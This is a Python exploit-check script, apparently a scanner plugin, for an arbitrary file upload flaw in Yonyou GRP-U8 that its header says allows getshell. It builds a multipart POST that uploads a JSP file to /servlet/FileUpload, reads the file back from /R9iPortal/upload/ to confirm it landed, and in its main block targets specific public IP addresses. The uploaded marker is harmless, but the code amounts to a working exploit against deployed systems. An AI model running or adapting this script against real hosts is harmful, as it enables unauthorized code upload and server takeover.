#!/usr/bin/evn python
#-*-:coding:utf-8 -*-

#Author:wonderkun
#Name: 用友 GRP-u8系统任意文件上传，可getshell  

#Refer:http://www.wooyun.org/bugs/wooyun-2010-0111404
#Data:2016/1/27  

'''
任意文件上传  /servlet/FileUpload?fileName=test.jsp&actionID=update  

本地构造表单 
上传后的路径是：/R9iPortal/upload/+fileName参数的值     

'''

def assign(service,arg):
    if service=="yongyou_u8":
        return True,arg

def audit(arg):
    vun_url=arg+"servlet/FileUpload?fileName=test.jsp&actionID=update"
    verify_url=arg+"R9iPortal/upload/test.jsp"
    raw='''POST /servlet/FileUpload?fileName=test.jsp&actionID=update HTTP/1.1
Host: 125.67.66.250:801
Content-Length: 29
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Origin: null
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryttI4BZKhDL2Vl8rL
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8
Cookie: JSESSIONID=3D2A49AAB839B03E25A57806A2AB773C

<% out.println("testvul");%>
'''
    code,head,res,errcode,finalurl=curl.curl2(vun_url,raw=raw)
    code,head,res,errcode,finalurl=curl.curl2(verify_url)
    if code==200 and "testvul" in res:
        security_hole('任意文件上传 '+vun_url)

if  __name__=="__main__":
    from dummy import *
    audit(assign('yongyou_u8','http://125.67.66.250:801/')[1])
    # audit(assign('yongyou_u8','http://124.128.96.98:8001/')[1])